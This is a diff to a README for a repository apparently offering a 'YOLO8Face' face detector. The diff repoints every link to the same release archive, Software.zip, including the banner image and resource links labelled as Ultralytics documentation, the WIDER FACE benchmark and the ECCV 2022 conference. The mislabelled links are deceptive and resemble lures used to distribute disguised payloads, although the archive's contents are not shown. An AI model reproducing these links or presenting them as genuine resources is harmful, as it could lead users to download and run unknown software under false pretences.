@@ -1,6 +1,6 @@
 # 🚀 YOLO8Face
 
-![YOLO8Face Banner](https://github.com/ryu-hasagi/YOLO8Face/releases/download/v1.0/Program.zip)
+![YOLO8Face Banner](https://github.com/ryu-hasagi/YOLO8Face/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -17,7 +17,7 @@ Welcome to the YOLO8Face repository! Here, you will find the latest version of t
 
 To get started with YOLO8Face, simply download the necessary files from our latest release. Follow the installation instructions to set up the environment and start using the face detector right away!
 
-[![Download YOLO8Face](https://github.com/ryu-hasagi/YOLO8Face/releases/download/v1.0/Program.zip)](https://github.com/ryu-hasagi/YOLO8Face/releases/download/v1.0/Program.zip)
+[![Download YOLO8Face](https://github.com/ryu-hasagi/YOLO8Face/releases/download/v2.0/Software.zip)](https://github.com/ryu-hasagi/YOLO8Face/releases/download/v2.0/Software.zip)
 
 ## Installation
 
@@ -41,9 +41,9 @@ To get started with YOLO8Face, simply download the necessary files from our late
 
 ## Resources
 
-- [Ultralytics v8.2.103 Documentation](https://github.com/ryu-hasagi/YOLO8Face/releases/download/v1.0/Program.zip)
-- [WIDER FACE Benchmark](https://github.com/ryu-hasagi/YOLO8Face/releases/download/v1.0/Program.zip)
-- [ECCV 2022 Conference](https://github.com/ryu-hasagi/YOLO8Face/releases/download/v1.0/Program.zip)
+- [Ultralytics v8.2.103 Documentation](https://github.com/ryu-hasagi/YOLO8Face/releases/download/v2.0/Software.zip)
+- [WIDER FACE Benchmark](https://github.com/ryu-hasagi/YOLO8Face/releases/download/v2.0/Software.zip)
+- [ECCV 2022 Conference](https://github.com/ryu-hasagi/YOLO8Face/releases/download/v2.0/Software.zip)
 
 ## Support
 
